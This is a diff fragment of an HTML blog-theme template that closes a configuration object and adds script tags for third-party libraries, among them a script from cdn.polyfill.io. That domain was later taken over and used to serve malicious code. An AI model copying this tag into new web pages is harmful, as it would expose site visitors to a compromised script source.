+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
